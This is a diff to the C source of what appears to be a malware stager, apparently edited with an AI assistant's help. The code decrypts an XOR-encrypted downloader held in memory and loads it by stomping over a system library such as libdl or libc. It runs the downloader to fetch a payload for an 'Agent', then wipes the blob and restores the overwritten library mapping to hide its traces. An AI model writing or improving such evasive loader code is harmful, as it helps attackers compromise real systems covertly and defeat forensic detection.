@@ -56,56 +56,84 @@ void stager_main(long *sp) {
   sigaction(SIGTRAP, &trap_sa, NULL);
 
   // 1. Prepare Downloader
-  // Map memory for downloader
+  // Map memory for downloader blob
   void *dl_mem = mmap(NULL, downloader_bin_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (dl_mem == MAP_FAILED) exit(1);
   
   memcpy(dl_mem, downloader_bin, downloader_bin_len);
   
   // Decrypt Downloader (XOR with downloader_key defined in blob header)
-  // Assuming downloader_blob.h defines `unsigned char downloader_key[]` (16 bytes)
   xor_payload((char *)dl_mem, downloader_bin_len, downloader_key, 16);
 
   // Load Downloader ELF
-  // We treat it as a blob that we can map? 
-  // Wait, elf_load expects `char *elf_start` (buffer containing ELF file).
-  // Yes.
   size_t dl_base = 0;
   size_t dl_entry_addr = 0;
-  // elf_load arguments: char *elf_start, void *stack, int stack_size, size_t *base_addr, size_t *entry, int pre_mapped, const char *module_path
-  int ret = elf_load((char *)dl_mem, NULL, 0, &dl_base, &dl_entry_addr, 0, NULL);
+  size_t dl_mapped_size = 0;
+  char dl_module_path[64] = {0};
+  
+  // Try to find a universal library for stomping
+  const char *candidates[] = {
+      "/lib/x86_64-linux-gnu/libdl.so.2",
+      "/lib64/libdl.so.2",
+      "/usr/lib/x86_64-linux-gnu/libdl.so.2",
+      "/lib/x86_64-linux-gnu/librt.so.1",
+      "/lib64/librt.so.1",
+      "/lib/x86_64-linux-gnu/libc.so.6",
+      "/lib64/libc.so.6"
+  };
+  
+  for (int i = 0; i < 7; i++) {
+      int fd = open(candidates[i], O_RDONLY, 0);
+      if (fd >= 0) {
+          close(fd);
+          long len = strlen(candidates[i]);
+          if (len < 63) {
+            memcpy(dl_module_path, candidates[i], len);
+            dl_module_path[len] = '\0';
+            break;
+          }
+      }
+  }
+
+  // elf_load arguments: char *elf_start, void *stack, int stack_size, size_t *base_addr, size_t *entry, size_t *mapped_size, int pre_mapped, const char *module_path
+  int ret = elf_load((char *)dl_mem, NULL, 0, &dl_base, &dl_entry_addr, &dl_mapped_size, 0, dl_module_path[0] ? dl_module_path : NULL);
   if (ret != 0) exit(1);
 
   // Run Downloader
   typedef void (*dl_func)(struct download_result *);
   dl_func dl_entry = (dl_func)dl_entry_addr;
-
-  // Run Downloader
+  
   struct download_result res = {0};
   dl_entry(&res);
 
   // Cleanup Downloader
-  // Ideally we unmap the segments loaded by elf_load.
-  // But elf_load maps segments to random addresses (or PIE relative).
-  // We don't have a list of mapped segments easily unless we track them.
-  // For now, we just wipe the source buffer `dl_mem` and unmap it.
-  // The loaded segments remain.
+  // 1. Wipe and unmap the blob
   memset(dl_mem, 0, downloader_bin_len);
   munmap(dl_mem, downloader_bin_len);
-  // Also wipe the loaded code?
-  // Since we want to "delete it from memory", we should unmap the loaded segments.
-  // But we didn't track them.
-  // Optimization: In `elf_load`, if we knew the bounds...
-  // `elf_load` returns 0 on success.
-  // The downloader ELF is small.
-  // Maybe we can modify `elf_load` to return bounds?
-  // Or just leave it for now (User said "delete it", unmapping source blob is partial/good enough effectively removing the "file", but memory remains).
-  // "run on demand. delete it from memory".
-  // If we assume `elf_load` maps contiguous memory for PIE?
-  // Usually yes.
-  // We can try to guess or just accept it's "mostly" gone (overwritten by Agent?).
-  // If Agent is huge, it might overlap? No, ASLR.
-  
+
+  // 2. Restore/Unmap the loaded ELF
+  if (dl_base && dl_mapped_size > 0) {
+      if (dl_module_path[0] != '\0') {
+          // Restore from file (put module back)
+          int fd = open(dl_module_path, O_RDONLY, 0);
+          if (fd >= 0) {
+              // Map over the existing stomped memory
+              // using MAP_FIXED to replace the mapping
+              void *restored = mmap((void *)dl_base, dl_mapped_size, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_FIXED, fd, 0);
+              if (restored == MAP_FAILED) {
+                  // If failed, just unmap
+                  munmap((void *)dl_base, dl_mapped_size);
+              }
+              close(fd);
+          } else {
+              munmap((void *)dl_base, dl_mapped_size);
+          }
+      } else {
+          // Just unmap anonymous memory
+          munmap((void *)dl_base, dl_mapped_size);
+      }
+  }
+
   if (!res.data || res.size == 0) exit(1);
 
   // 2. Load Agent
